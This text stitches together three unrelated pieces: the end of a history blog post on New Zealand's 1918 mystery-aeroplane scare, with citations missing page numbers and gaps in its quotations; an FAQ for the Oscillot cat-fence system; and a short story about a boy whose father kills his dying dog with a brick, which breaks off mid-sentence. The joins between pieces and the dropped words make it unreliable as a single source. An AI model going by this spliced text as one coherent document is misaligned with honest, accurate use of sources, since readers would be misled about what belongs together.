are lucky enough to get back to their native shores, after being under the <b>iron</b> flail for months -- perhaps for years.</p>   </blockquote>   <p>This was exactly the same discourse that was evident across the Tasman at the same time: that it would do Australians some good to have some bombs dropped on them. While this didn't happen, both Australians and New Zealanders did start , by seeing hostile aircraft in the skies.</p>   <p>Interestingly, a leading article in the <em>Observer</em> on 6 April seemed to suggest that the scare over mystery aeroplanes, German raiders and Paris Guns was not about dreaming this war, but rather was about dreaming the <em>next</em> war, apparently with Japan:</p>   <blockquote>    <p>There are local signs from people who have never seen war, and have never lived on a frontier with shells of war, that they have It is to be remembered that we are many thousands of miles from the gun that is set up to kill Parisians, and that there is no credit in being either optimistic or courageous so far away. But to those people who are getting 'the wind up' one would say, as one has said so many times before, that New Zealand its very self will sooner or later become the same sort of a cockpit as Belgium, and that the courage of civilian New Zealanders will enhance in the same proportion as her danger increases. It is said by those who understand the signs that the Pacific will yet become the battle ground (or sea) for humanity.</p>   </blockquote>   <p>There follow references to a recent controversy over the future status of Samoa, leading to the question of whether the sort of person who 'only shoots off his mouth' about war will 'shed his own blood for New Zealand when New Zealand is a frontier, and the enemy is battering at its <b>gates</b>? -- not the <b>gates</b> of Paris, but of Wellington and <b>Auckland</b>'. The aerial threat appears in the next paragraph:</p>   <blockquote>    <p>People living on frontiers always expect war, and insular people always affect to believe that islands are impregnable. There is no impregnability anywhere, for the rapidly developing sky battle machine has altered all that, and the enemy has even invaded England, if persistent air raids can be called invasion. What is possible in the method of attack on England is also possible as far as little New Zealand is concerned. Every ounce of war effort made by New Zealand has, of course, been in the direction of sending men out of the country, and not in preparation for the defence of this country -- a defence, by the way, that will have to be naval. In the future the discipline of the people will have to be of a sterner kind if New Zealand is to be held by New Zealanders, and by every known means the State should instil into the people a knowledge of the possibilities. Everyone should be told in the plainest terms that New Zealand is not to be immune from war. When her time of trial comes may New Zealanders, with the philosophy of Jean, say, 'C'Est la guerre!'</p>   </blockquote>   <p>The leading article ended by predicting that </p>   <blockquote>    <p>New Zealanders will have to grit their teeth harder and make a better do of it if the country is to remain British, and look forward to a day when, with shells falling in , the citizens calmly exclaim, 'Why worry -- &quot;C'Est la guerre!&quot;'</p>   </blockquote>   <p>Did New Zealanders really have the wind up? After all, only a handful of mystery aeroplane sightings had been . And nearly everything discussed in this post is either couched in humorous terms, and is from the one newspaper. So it could be a bit of a beat-up. Indeed, after late April, even the sorts of half-joking reports of mystery aeroplanes I discussed disappeared. </p>   <p>But only for a while. In the next post in this series I'll examine the re-emergence of the scare at the end of May 1918. And finally I'll look at the evidence for the government's response to the mystery aeroplanes.</p>   <div>    <div>     <h3>Possibly-related posts:</h3>    </div>   </div>   <ol>    <li><p><em>New Zealand Observer</em> (<b>Auckland</b>), 4 May 1918, .&#xa0;</p></li>    <li><p>Ibid., 30 March 1918, .&#xa0;</p></li>    <li><p><em>New Zealand Free Lance</em> (Wellington), 4 April 1918, .&#xa0;</p></li>    <li><p><em>New Zealand Observer</em>, 13 April 1918, .&#xa0;</p></li>    <li><p>Ibid.&#xa0;</p></li>    <li><p>Ibid., 20 April 1918, .&#xa0;</p></li>    <li><p>E.g. <em>New Zealand Herald</em> (<b>Auckland</b>), 1 April 1918, .&#xa0;</p></li>    <li><p>Compare another item from the 'They Say' column about how Aucklanders wouldn't mind something like a Paris Gun to hit Parliament House with: <em>New Zealand Observer</em>, 30 March 1918, 7.&#xa0;</p></li>    <li><p>Ibid., 4 May 1918, 5.&#xa0;</p></li>    <li><p>Ibid., 30 March 1918, 7.&#xa0;</p></li>    <li><p>Ibid., 16 March 1918, .&#xa0;</p></li>    <li><p>Ibid., 6 April 1918, .&#xa0;</p></li>    <li><p>Ibid.&#xa0;</p></li>    <li><p>Ibid.&#xa0;</p></li>    <li><p>Ibid.&#xa0;</p></li>   </ol>    <p> This work is licensed under a .

   <article>   <div>    <p>With an Oscillot system, your cat is free to roam &#x2013; at home (and help out with the gardening).</p>   </div>   <h3>Is there a minimum height at which the Oscillot&#xae; System must be installed?</h3>   <p>Yes, we recommend that the Oscillot&#xae; System be installed on fences at least 1.8 metres high. If your fence is shorter, you can install fence extensions, trellis or polycarbonate sheeting to increase the height and then install the Oscillot&#xae; Paddles on top.</p>   <h3>How do I measure my yard for the Oscillot&#xae; System?</h3>   <p>Please visit the page for an illustration showing how to measure your yard for the Oscillot&#xae; System. If you are still unsure, contact us for advice or to arrange a measure-and-quote (currently available in the <b>Auckland</b> Region only).</p>   <h3>Do I need my neighbours&#x2019; permission to install Oscillot&#xae; on top of a fence we share?</h3>   <p>We recommend that you obtain permission from your neighbour if you plan to install the Oscillot&#xae; System on top of a shared fence. Oscillot is very unobtrusive, and will keep you cat from roaming onto your neighbour&#x2019;s property. If getting permission isn&#x2019;t possible, you could also consider creating a fenced area <em>inside</em> your yard.</p>   <h3>Do I have to get Council approval to install Oscillot&#xae; on top of my fence?</h3>   <p>Generally you should not need Council approval to install the Oscillot&#xae; System on top of your fence as long as you are not exceeding the maximum height permitted. If in doubt, please check with your Council.</p>   <h3>Is the Oscillot&#xae; System suitable for all types of fences?</h3>   <p>Although Oscillot&#xae; is suitable for installation on most types of fences such as steel, galvanised, timber, masonry and brush fencing, it is not effective on tubular and wrought <b>iron</b> fences where spacing between the vertical bars allows an easy escape for a cat. For more information see ?</p>   <h3>Is there a guarantee that my cats won&#x2019;t escape my yard if I have the Oscillot&#xae; System?</h3>   <p>The Oscillot&#xae; System is a safe and effective way to prevent your cat from scaling your fence if installed correctly on suitable fence types. However, installing the Oscillot&#xae; System alone will not always prevent your cat from escaping your yard. You need to take into account the variables that may be present in your yard such as trees and other objects near the fence, gaps under the fence, etc.</p>   <h3>Can I get the Oscillot&#xae; System installed for me if I am not able to do it myself?</h3>   <p>We currently offer installation service in the <b>Auckland</b> Region only, but expect to appoint installers in other areas soon. You can also arrange with your local handyman service to have them install your Oscillot&#xae; System.</p>   <h3>Is there a warranty on the components?</h3>   <p>Yes, there is a 3-year warranty on the Dual Knuckle Post Kit and the Paddle. This warranty covers manufacturing faults and workmanship. This warranty does not cover general environmental wear and tear. Whilst in outer urban and rural areas the materials used in the Oscillot&#xae; System may have a life span in excess of 30 years, this can be significantly reduced by corrosion from salt particles or acid laden fumes in coastal or industrial environments. It is recommended that you regularly wipe down the paddles and end posts, at least once every six months, or more often if you live in a coastal area. []</p>  </article>

Splashes of sunshine fell through the window onto Ruben&#x2019;s face. He&#x2019;d only visited Dad once before. Dad had given him a big man&#x2019;s watch which dropped off Ruben&#x2019;s wrist. &#x201c;Don&#x2019;t you feed him?&#x201d; Dad had growled at Mum. She&#x2019;d rolled her eyes and said under her breath, <em>&#x201c;Idiot</em>.<em>&#x201c;</em></p>   <p>The motorway ended and the bus drove through dry farmland. Bleached tree-stumps huddled in groups like dinosaur bones. Soon, farms gave way to a row of shops with garage roller doors. Takeaways. A superette. A line of sad-looking houses with scraggly lawns and rusty swing-sets. Ruben recognized the pub with a rooster painted on it.</p>   <p>Braking with a screech, the bus paused in a layby. Ruben bounded down the steps, sprinting to Dad&#x2019;s little grey hatchback parked up on the verge. It was empty.</p>   <p>A motorbike tore past, shrinking into a soft dot.</p>   <p>Where was Dad? Ruben&#x2019;s ninth birthday had been and gone and Dad hadn&#x2019;t turned up for it. Hadn&#x2019;t even rung. For his eighth, he&#x2019;d arrived with a pocket knife that fell to bits as soon as Ruben opened it. &#x201c;Two-dollar shop rubbish,&#x201d; Mum said afterwards. &#x201c;It&#x2019;s <em>not</em> rubbish!&#x201d; Ruben flashed back, running to the end of the driveway, his heart about to explode.</p>   <p>Heat quivered off the baking tarseal. Cicadas droned scritch-scritch-scritch. Across the road, cows sat in the shade of a twisted tree. The cows could have been carved out of rock, not even a tail twitched.</p>   <p>Ruben&#x2019;s damp hair clung to his forehead. He pushed it out of his eyes. Brown hair, same as Mum&#x2019;s. He got his height from Dad. He was the tallest kid in class, people mistook him for being eleven or twelve. There was power in being tall. He hadn&#x2019;t worked it out exactly, yet when he&#x2019;d scowled down at Sam &#x2013; who&#x2019;d said Ruben&#x2019;s Dad was a dumb arse and his Mum was a ho &#x2013; Sam backed off without another mean word.</p>   <p>A cattle truck loomed and clattered by spitting gravel.</p>   <p>Ruben spotted someone in the distance, he couldn&#x2019;t tell if it was a man or a woman, he held his breath&#x2026;<em>please</em> be Dad. It was Dad, his hair fiery in the sun. Dad walked closer, kicking up gingery dust from the side of the road.</p>   <p>&#x201c;Hey, stranger.&#x201d;</p>   <p>&#x201c;Where were you?&#x201d; Ruben blurted.</p>   <p>&#x201c;Up at the shops,&#x201d; Dad threw a chocolate bar to Ruben.</p>   <p>&#x201c;I&#x2019;ve been waiting ages.&#x201d;</p>   <p>&#x201c;Hop in,&#x201d; Dad half-crouched to fit in the little car.</p>   <p>A cricket in a matchbox, Ruben thought.</p>   <p>It took Dad five goes to get the engine started. The car bumped over a pothole, all the windows rattling in their frames. They drove past more cows and crossed over a stream, swinging onto a narrow road. Dad parked in the driveway of the blue house made of knobbly concrete.</p>   <p>They walked up the gravel path. Dad was even skinnier than before and bent over as if he were old. If he ever came to school, the kids would think he was Ruben&#x2019;s <em>Granddad</em>.</p>   <p>The backyard was a jumble of wood-piles, bricks and overgrown weeds. A creek, running along the end of the section, was shaded by droopy trees.</p>   <p>&#x201c;Sad time for Homer,&#x201d; Dad sighed. The black labrador lay on a blanket by the wash-house. A tarpaulin was stretched out above him, and a sofa with stuffing oozing from its armrests. Squashed beer cans glinted in the long grass.</p>   <p>Homer rolled his eyes up to Dad and groaned.</p>   <p>&#x201c;What&#x2019;s wrong with him?&#x201d; Ruben asked.</p>   <p>&#x201c;Old. No cure for it, least none I know of.&#x201d;</p>   <p>Ruben had never seen a sick animal before. When his guinea pig died, it simply fell asleep one night.</p>   <p>Dad went into the wash-house, coming out with a car door and propping it against the sofa so that Homer had more shade.</p>   <p>&#x201c;You can pat him, if you want.&#x201d;</p>   <p>Ruben&#x2019;s hands felt cold and tingly, he stuffed them in his pockets. He started humming.</p>   <p>&#x201c;What&#x2019;s that song?&#x201d;</p>   <p>&#x201c;Mum sings it when I&#x2019;m sick.&#x201d;</p>   <p>Dad&#x2019;s eyes softened. His face stayed hard, though.</p>   <p>A pair of hawks sailed overhead, their wings tipped upwards.</p>   <p>&#x201c;Looking for road kill,&#x201d; Dad followed Ruben&#x2019;s gaze. &#x201c;Rabbits, hedgehogs, dumb possums. If you find anything dead on the road, kick it to the side so a hawk doesn&#x2019;t end up road kill, too.&#x201d;</p>   <p>Ruben nodded.</p>   <p>&#x201c;Put your bag in the front room.&#x201d;</p>   <p>Ruben pushed past the fig tree, it had grown up through the washing line and was covered in fruit. Nibbled figs showed bright pink insides. The tree needed a net over it. Mum had hung a net over the peach tree at home so birds wouldn&#x2019;t eat the fruit.</p>   <p>He smelt the loo. It was in the lean-to bathroom. You pulled a long chain to flush it, water shot into the bowl and the loo hee-hawed loud as a donkey. He&#x2019;d nearly jumped out of his skin when him and Mum had visited.</p>   <p>Ruben went inside the house. The first room on the left was the kitchen, then the lounge. Two bedrooms were on the right, the smallest one was at the end of the hall where a broken computer and two tellies were stacked against the front door.</p>   <p>The bedroom wasn&#x2019;t much bigger than a cupboard. It had old flowery wallpaper curling around the edges and only enough space for the camp bed and a dressing table with its mirror missing.</p>   <p>&#x2013;</p>   <p>Dad sat across from Ruben at the kitchen table, drinking beer. Shrubs had grown across the window giving the room a green underwater feel.</p>   <p>A fly landed on the table, sidling up to the tomato sauce bottle. Dad shooed it off.</p>   <p>The chops were tough. The mash had grey lumps in it.</p>   <p>&#x201c;How&#x2019;s your tea?&#x201d; Dad asked.</p>   <p>&#x201c;Yum as.&#x201d;</p>   <p>&#x201c;I&#x2019;ll cut it,&#x201d; Dad leant forward, slicing Ruben&#x2019;s chop into pea-sized pieces. &#x201c;What&#x2019;d you do in the holidays?&#x201d; he asked.</p>   <p>&#x201c;Not much&#x2026;got a Nintendo for Christmas. My friend Sam got a Wii. Mum said I might get one now she&#x2019;s working &#x2019;til five. I go to after-school with Sam. There&#x2019;s a swimming pool, the intermediate kids won&#x2019;t Iet us in the deep end.&#x201d;</p>   <p>Dad crushed his beer can and burped. &#x201c;What&#x2019;s your favourite subject?&#x201d;</p>   <p>&#x201c;Art. I won a drawing competition.&#x201d;</p>   <p>&#x201c;True?&#x201d;</p>   <p>&#x201c;Yep. Mum bought me pizza at a restaurant.&#x201d;</p>   <p>&#x201c;Great,&#x201d; Dad answered in a flat voice.</p>   <p>&#x201c;I won a thirty dollar book voucher,&#x201d; Ruben added, but something had gone wrong.</p>   <p>&#x201c;Better check on Homer,&#x201d; Dad pushed back his chair.</p>   <p>Ruben spat out the mouthful he&#x2019;d been politely chewing. The room was stifling. He tried to open the window but the shrubs were tightly pressed against it. Through a gap in the leaves he saw Dad sitting on the sofa. As if drawn by a string, Ruben went out to join him.</p>   <p>Dad bent down holding a sipper bottle to Homer&#x2019;s mouth. Homer slurped water and whimpered.</p>   <p>&#x201c;Poor thing,&#x201d; Ruben said, trying not to cry. &#x201c;I wish we could help him.&#x201d;</p>   <p>&#x201c;Have to keep the old fulla company.&#x201d;</p>   <p>It was so quiet &#x2013; even the birds had stopped calling. Ruben felt self-conscious, he wanted to speak but couldn&#x2019;t think of anything to say.</p>   <p>Eventually, footsteps sounded on the gravel path. Ruben turned around. A teenager strolled towards them carrying a box of beer.</p>   <p>&#x201c;Hey, Brodie,&#x201d; Dad said. &#x201c;This is Ruben. Ruben, Brodie&#x2019;s from next door.&#x201d;</p>   <p>Brodie cocked his head to one side, &#x201c;How do you know Big Red?&#x201d;</p>   <p>&#x201c;He&#x2019;s my Dad.&#x201d;</p>   <p>&#x201c;Huh.&#x201d;</p>   <p>Homer&#x2019;s tail shook weakly.</p>   <p>&#x201c;Pleased to see me, boy?&#x201d; Brodie squatted down, stroking him. &#x201c;Good boy, good boy.&#x201d;</p>   <p>&#x201c;Breaks my heart,&#x201d; Dad said.</p>   <p>&#x201c;Better sort it out soon,&#x201d; Brodie lit a rollie.</p>   <p>Ruben stared, amazed, as Brodie put his mouth close to Homer&#x2019;s nose and breathed out. The rollie smelt funny &#x2013; reminding him of the rotting hay Mum bought for their worm farm.</p>   <p>Three more puffs and Homer lay still.</p>   <p>&#x201c;Is he all right?&#x201d; Ruben whispered.</p>   <p>&#x201c;Course, calmed him down. Sad old mutt.&#x201d; Brodie pulled off his beanie and a bushy ball of black hair sprang out. &#x201c;You gotta get rid of your rubbish, Red. It&#x2019;s bringing rats.&#x201d;</p>   <p>Dad shrugged.</p>   <p>&#x201c;You said you&#x2019;d do it last week. My olds are totally pissed off.&#x201d;</p>   <p>&#x201c;Okay, okay. Tomorrow.&#x201d;</p>   <p>Brodie opened his box of beers, handing one to Dad. &#x201c;Hey, little buddy,&#x201d; he said, &#x201c;how do you put up with this guy?&#x201d;</p>   <p>Ruben liked Brodie&#x2019;s big smile and friendly eyes. &#x201c;Easy,&#x201d; he said proudly.</p>   <p>&#x201c;How come I haven&#x2019;t seen you before?&#x201d;</p>   <p>&#x201c;I live in town.&#x201d;</p>   <p>&#x201c;You should come down more often &#x2013; might make Red less grumpy.&#x201d;</p>   <p>&#x201c;Just had tea,&#x201d; Dad said. &#x201c;There&#x2019;s leftovers if you want.&#x201d;</p>   <p>Brodie shook his head.</p>   <p>&#x201c;What can we offer him?&#x201d; Dad asked Ruben.</p>   <p>A warm feeling sparked in Ruben. &#x201c;Coco Pops?&#x201d; he suggested.</p>   <p>&#x201c;Don&#x2019;t worry about it, already had a feed,&#x201d; Brodie sculled his beer.</p>   <p>&#x201c;Can I have Coco Pops for pudding?&#x201d;</p>   <p>&#x201c;Knock yourself out,&#x201d; Dad said.</p>   <p>As Ruben scooted off, he heard Brodie say, &#x201c;Since when did you have a kid?&#x201d;</p>   <p>&#x201c;Didn&#x2019;t see that coming, did you?&#x201d; Dad laughed.</p>   <p>However, all Ruben could think of was Dad saying, &#x201c;What else can <em>we</em> offer him?&#x201d; The warm feeling grew bigger. He had the idea that the world, though immense, was light as a feather and could change utterly &#x2013; wonderfully &#x2013; in a split second. He filled a bowl with Coco Pops, sitting on the back step to eat them. A fingernail moon shone, millions of stars &#x2013; like Guy Fawkes, without all the crack-crackle-booms.</p>   <p>Up ahead, Brodie lit a cigarette. Smoke gathered around his bushy hair turning it into an enormous ghostly dandelion.</p>   <p>&#x201c;You on for tonight, Red?&#x201d;</p>   <p>&#x201c;Better not, got the kid.&#x201d;</p>   <p>&#x201c;He&#x2019;ll be all right.&#x201d;</p>   <p>A dark shape slid through the fig tree. Ruben glimpsed a rat nibbling a fig. The rat melted back into a dark shape, slipping away.</p>   <p>&#x2013;</p>   <p>Ruben woke to the sound of loud music and wolf whistles. The party noise was coming from next door.</p>   <p>&#x201c;Dad?&#x201d; he called out. &#x201c;Dad?&#x201d;</p>   <p>The light was on in Dad&#x2019;s room. Dad wasn&#x2019;t there, not in the lounge or the kitchen, either.</p>   <p>Even though he was scared of the rat, Ruben creaked open the back door and tiptoed to where the hedge thinned. He could see Brodie&#x2019;s carport where people were standing around under a yellow light, drinking. An old nana came out of the house wearing purple trackpants and a long cardi.</p>   <p>&#x201c;Give us a song, Venus,&#x201d; came Dad&#x2019;s voice.</p>   <p>Crack! went Ruben&#x2019;s heart. He missed Mum so badly he thought he might puke. She&#x2019;d never left him alone at night, she watched telly on her own, he&#x2019;d fall asleep hearing it through the wall.</p>   <p>&#x201c;Come on,&#x201d; Brodie piped up.</p>   <p>&#x201c;Nah, I&#x2019;m not pissed enough,&#x201d; the old nana said.</p>   <p>&#x201c;Bloody hell, get on with it.&#x201d;</p>   <p>&#x201c;Shut your ugly face!&#x201d;</p>   <p>Ruben hurried back into the house, slamming the door behind him.</p>   <p>&#x2013;</p>   <p>Daylight seeped in beneath the curtain&#x2026;Ruben had dreamt of his blue-striped curtains back home. A rat had been scuffling around behind them, he&#x2019;d put his foot out to squash it and a ginger kitten squirmed out. The kitten was so small it had fitted in one hand.</p>   <p>A rooster crowed outside. Ruben got up and opened the curtain. The rooster was in Brodie&#x2019;s yard, standing on a wrecked car up on blocks.</p>   <p>Ruben put on a clean tee shirt and shorts and wandered out to Homer. The dog was so thin his ribcage stuck out. If only he could hold Homer in one hand and comfort him like he&#x2019;d comforted the dream kitten. He gently placed the palm of his hand on Homer&#x2019;s chest; Homer&#x2019;s heart shivered in its bony hutch.</p>   <p>The words to Mum&#x2019;s song came to him, he sang, <em>&#x201c;I got you, that&#x2019;s all I want. I won&#x2019;t forget, that&#x2019;s a whole lot&#x2026;You can see my eyes, you can tell that I&#x2019;m not ly-y-ing.</em>&#x201d;</p>   <p>Homer gave a scrappy yawn and fell asleep.</p>   <p>Hungry, Ruben went into the kitchen. The milk smelt funny so he only used a little on his Coco Pops.</p>   <p>Dad shuffled in, he had puffy eyes and a glittery day-old beard. &#x201c;Want a cuppa?&#x201d; he asked.</p>   <p>&#x201c;No, thanks.&#x201d;</p>   <p>&#x201c;Hope next door didn&#x2019;t wake you last night.&#x201d;</p>   <p>Ruben kept eating.</p>   <p>Dad scratched his beard. &#x201c;Have you seen the eels?&#x201d;</p>   <p>&#x2013;</p>   <p>Ruben followed Dad past flax, and a bush with leaves sharp as teeth. Jittery sparrows pecked about on top of a pile of bricks, scattering when they neared.</p>   <p>The creek twinkled where daylight shone through a gap in the trees. Dad pointed to a fern growing over the bank. &#x201c;Can you see it?&#x201d; he said. &#x201c;It&#x2019;s having a snooze.&#x201d;</p>   <p>A mud-coloured eel flicked its tail. Ruben leapt back as if bitten. The eel lazily stretched out, sliding away.</p>   <p>&#x201c;Want to catch it?&#x201d;</p>   <p>&#x201c;Yes, please!&#x201d;</p>   <p>&#x201c;There&#x2019;s a bucket in the wash-house, we&#x2019;ll need that.&#x201d;</p>   <p>A wild joy swept through Ruben as he raced to the wash-house.</p>   <p>&#x201c;Get the bread and a knife,&#x201d; Dad yelled. &#x201c;A sharp knife.&#x201d;</p>   <p>Ruben zigzagged past the flax and the pile of bricks. The wash-house was filled with junk. He stopped in the doorway, spotting a bucket on a rolled up carpet. He skip-ran past Homer, dashing to the house. Opening the fridge, he thrust the bag of bread into the bucket. The only knife on the bench was a small vegetable peeler. He checked in a drawer of kitchen things, finding a bigger knife and running out the door.</p>   <p>Dad had stripped off a length of flax and was making a noose. &#x201c;I&#x2019;ll fish them out,&#x201d; he said. &#x201c;You put them in the bucket quick as you can.&#x201d;</p>   <p>&#x201c;There it is!&#x201d; Ruben shouted.</p>   <p>&#x201c;Ssh&#x2026;ssh&#x2026;&#x201d;</p>   <p>The eel swam towards them with the wavy motion of a cat&#x2019;s tail.</p>   <p>Dad baited a stick with balled-up bread, slipping the noose and the stick into the water.</p>   <p>More eels approached, their side fins fluttering. One moved closer to the baited stick. Dad yanked the noose and the eel thrashed in the air before landing on the grass. Ruben screamed.</p>   <p>&#x201c;Get it!&#x201d; Dad said.</p>   <p>&#x201c;I can&#x2019;t. I can&#x2019;t.&#x201d;</p>   <p>The eel hooked backwards.</p>   <p>&#x201c;Quick.&#x201d;</p>   <p>Ruben made a grab for the eel, &#x201c;Ahh! It&#x2019;s slimy!&#x201d;</p>   <p>The eel curved towards the water. Dad reached across, whacking its head with a piece of wood.</p>   <p>&#x201c;You k-k-killed it,&#x201d; Ruben said in a squeaky voice.</p>   <p>Dad rebaited the stick. &#x201c;Quiet,&#x201d; he said, &#x201c;this is lunch.&#x201d;</p>   <p>&#x2013;</p>   <p>&#x201c;That&#x2019;s enough for me,&#x201d; Dad leant back in his chair.</p>   <p>&#x201c;It&#x2019;s weird that eels are fish,&#x201d; Ruben said.</p>   <p>&#x201c;Better than trout.&#x201d;</p>   <p>Ruben pushed together the last pieces of eel on his plate, he thought they were worse than eating slugs. &#x201c;I haven&#x2019;t had trout,&#x201d; he said.</p>   <p>&#x201c;Prefer eels.&#x201d;</p>   <p>&#x201c;Mmm&#x2026;it was fun catching them.&#x201d;</p>   <p>Outside, Homer let out a long moaning howl, giving Ruben goosebumps.</p>   <p>Dad opened his tobacco pouch and rolled a smoke, carefully nipping stray threads off each end.</p>   <p>Homer howled again.</p>   <p>Dad&#x2019;s eyes went dark and blank. &#x201c;How about you do the dishes?&#x201d; he said.</p>   <p>&#x201c;Sure, I help at home.&#x201d;</p>   <p>&#x201c;Think I&#x2019;ll go have a smoke.&#x201d;</p>   <p>Ruben scraped all the leftover eel onto one plate. Mum always covered food with gladwrap; he couldn&#x2019;t find any in the cupboards so he put the eel straight into the fridge.</p>   <p>&#x2013;</p>   <p>Dad lifted up one of the black rubbish sacks that were piled against the hedge. &#x201c;Give us a hand,&#x201d; he said to Ruben.</p>   <p>White butterflies trembled above the hedge, while untold flies zoomed around the sacks. The stink was terrible.</p>   <p>Giddy at the thought of rats, Ruben stayed put.</p>   <p>&#x201c;Come on, we need to get to the dump before it shuts.&#x201d;</p>   <p>Mouldy lumps dropped from a hole in the bottom of the sack as Dad carried it to the car .</p>   <p>Gingerly, Ruben hoisted up a sack.</p>   <p>&#x201c;Look out,&#x201d; Dad said. &#x201c;It&#x2019;s moving.&#x201d;</p>   <p>Ruben shrieked.</p>   <p>&#x201c;Just jokes,&#x201d; Dad laughed. &#x201c;I&#x2019;ll do it, you wait in the car.&#x201d;</p>   <p>Ruben sat in the front seat, pinching his nose and breathing through his mouth. Dad got in and they drove down to the main road.</p>   <p>&#x201c;How far away is the dump?&#x201d;</p>   <p>&#x201c;Bout ten minutes.&#x201d; Dad slowed down as a group of hooded boys wandered across the road. &#x201c;Stoners,&#x201d; he said.</p>   <p>They passed the superette and the takeaways, turning at the rooster pub. More sad-looking houses. A trampoline up on its side. A strange cactus in the shape of prickly dinner plates. They stopped outside an <b>iron</b> fence with loops of barbed wire strung along the top.</p>   <p>&#x201c;Might as well drop in on Mozzie,&#x201d; Dad said. &#x201c;He&#x2019;s got the most amazing car you&#x2019;ll ever see. Built it himself.&#x201d;</p>   <p>Dad opened the side gate for Ruben. They passed a white wooden house, a garden full of sprawling daisies, and a ute parked on the driveway. A fat dog came out of the garage. Ruben moved closer to Dad. The dog waddled over, &#xa0;sniffing Dad&#x2019;s feet &#x2013; the same sort of dog who, if it clamped down, would lock its jaws and never let go. Ruben had seen one on <em>Police Ten</em>.</p>   <p>It was a moment before Ruben&#x2019;s eyes adjusted to the hazy gloom in the garage. In the middle of greasy car parts was a shiny black car, its hood raised and a beam of light trained into the engine.</p>   <p>A bald man sat on a crate. He wore shorts as small as undies. He said, &#x201c;Yo, Red,&#x201d; puffed on a cigarette and blew smoke out his nose.</p>   <p>&#x201c;My boy, Ruben,&#x201d; Dad said. &#x201c;Ruben, Mozzie.&#x201d;</p>   <p>Mozzie had bulging eyes and tattoos on his neck. &#x201c;There&#x2019;s a surprise,&#x201d; he said without surprise, squashing his cigarette on the floor. &#x201c;This bloody heat, man. Can&#x2019;t think in it.&#x201d; He reached round, opening a fridge. Threw a beer at Dad. &#x201c;Maybe in couple year&#x2019;s time, eh Ruben? Off you go and play outside.&#x201d;</p>   <p>&#x201c;Only be a minute,&#x201d; Dad said.</p>   <p>Ruben emerged into the sunshine. From behind, came the dog, its claws sounding like marbles rolling along the floor.</p>   <p>&#x201c;She won&#x2019;t bite,&#x201d; Mozzie called out. &#x201c;She&#x2019;s full of pups.&#x201d;</p>   <p>The dog gazed at Ruben with faded eyes. She gulped air and lay on her side, staring at the backyard. Brown leaves dangled on a tree. Plums lay rotting on the ground with wasps zzz&#x2019;ing around them.</p>   <p>What creatures ate wasps? Ruben wondered. He&#x2019;d google it when he got home. He counted ants trickling along the concrete, growing drowsy after a hundred and three.</p>   <p>&#x2013;</p>   <p>&#x201c;Time to go,&#x201d; Dad woke Ruben.</p>   <p>Above Dad&#x2019;s head, the sky had filled with clouds. Mozzie&#x2019;s dog gruffed and resettled herself.</p>   <p>&#x201c;See you&#x2019;ve made a friend.&#x201d;</p>   <p>Ruben patted the dog&#x2019;s head and she nuzzled his hand. &#x201c;She&#x2019;s nice,&#x201d; he said.</p>   <p>&#x201c;This heat can&#x2019;t be much fun for her. She&#x2019;ll be happier when she offloads those pups.&#x201d;</p>   <p>Dad continued down the driveway, saying, &#x201c;It&#x2019;s too late for the bloody dump.&#x201d;</p>   <p>&#x201c;What about the rubbish?&#x201d;</p>   <p>&#x201c;Plan B,&#x201d; Dad opened the gate for Ruben.</p>   <p>They drove off, turning where a signpost said, <em>&#x201c;Lookout, 400m&#x201d;</em>.</p>   <p>&#x201c;What&#x2019;s at the Lookout?&#x201d;</p>   <p>&#x201c;The river.&#x201d;</p>   <p>The car bumped along a shingle road, ending in a carpark ringed by huge dark-green trees. Dad drew up next to a picnic table and a bin.</p>   <p>&#x201c;You can&#x2019;t fit all the rubbish in that bin,&#x201d; Ruben said.</p>   <p>&#x201c;Well, I can&#x2019;t take it home or Brodie&#x2019;s old man&#x2019;d kill me.&#x201d;</p>   <p>Dad hefted a sack out of the boot, stuffing it into the bin. Lifted up another sack, carrying it into the trees. A compost smell came up from the track as Ruben scuffed along after him. Pencils of light poked through gaps in the branches. The river could be heard gurgling. Birds sang kiddee-kiddee-kiddee.</p>   <p>Dad dropped the sack behind a bush. At home, Ruben and Mum had a recycling bin for bottles and cans, a compost bin for grass clippings, a worm farm for peelings and paper, and a wheelie bin for everything else.</p>   <p>Dad pushed past. &#x201c;Four to go,&#x201d; he said, his hair flashing as he cut through a pencil of light.</p>   <p>Ruben trudged back to the car. He picked up an empty chip bag, mashing it down inside the bin.</p>   <p><em>Kiddee-kiddee-kiddee</em>, birds flew fast overhead.</p>   <p>Ruben sat in the car, his stomach tied in a knot. It was wrong to dump rubbish.</p>   <p>Dad came back. &#x201c;All done. Home time,&#x201d; he revved the engine, tearing out of the carpark with dust rising behind them.</p>   <p>Ruben stared out the window; he had to make up for the rubbish.</p>   <p>When they got back to Dad&#x2019;s, they heard Homer whining before they&#x2019;d even opened the car doors.</p>   <p>&#x201c;Go inside and have a drink,&#x201d; Dad said, striding up the path.</p>   <p>Maybe a drawing would help? Yes, a drawing for Mum. Ruben got his sketchbook and pencils out of his bag, taking them into the kitchen. He sat at the table, thinking about what to draw&#x2026;and began sketching an eel with side fins the same shape as fans. He loved shading in the eel&#x2019;s curving tail and seed-black eyes. He&#x2019;d show Dad.</p>   <p>Outside, drizzle was falling. Steam rose from the warm ground. Homer was quiet. Maybe he was sleeping? Ruben padded down to the tarpaulin.</p>   <p>Dad knelt beside Homer, holding a brick in his hand. Homer&#x2019;s legs twitched.</p>   <p>Ruben began screaming, <em>&#x201c;No. No. No.&#x201d;</em> But the words stuck in his head, nothing came out of his mouth.</p>   <p>Dad let out a long shivery sigh and bashed Homer on the head. Homer stopped moving. Dad threw away the brick. It hit the wash-house and thumped into a clump of weeds.</p>   <p>Ruben gasped.</p>   <p>Dad caught sight of him. &#x201c;What are you looking at?&#x201d; he roared.</p>   <p>&#x201c;The vet,&#x201d; Ruben burst out.</p>   <p>&#x201c;The vet costs a bloody fortune!&#x201d;</p>   <p>&#x201c;Mum would help.&#x201d;</p>   <p>&#x201c;Two weeks child support to put him down &#x2013; that&#x2019;s how much a vet costs.&#x201d; Dad got up quickly, hitting his head on the tarpaulin. &#x201c;F***!&#x201d;</p>   <p>Stumbling over beer cans, Ruben ran back into the house, shutting the bedroom door and thudding back against it trembling with shock. It had never occurred to him that Dad paid Mum&#x2026;it was <em>his</em> fault Homer had been killed.</p>   <p>He heard Dad moving around in the kitchen. A pot lid fell onto the floor, clattering. Ruben barely breathed.</p>   <p>Dad crunched across the gravel path alongside the house.</p>   <p>Ruben crossed to the window. Head down, shoulders hunched against the drizzle, Dad went to Brodie&#x2019;s. The view blurred. Tears. Ruben blinked them back. Anger boiled up, he wanted a real Dad not a Big Red. He put on his hoodie; soft, smelling of Mum. He 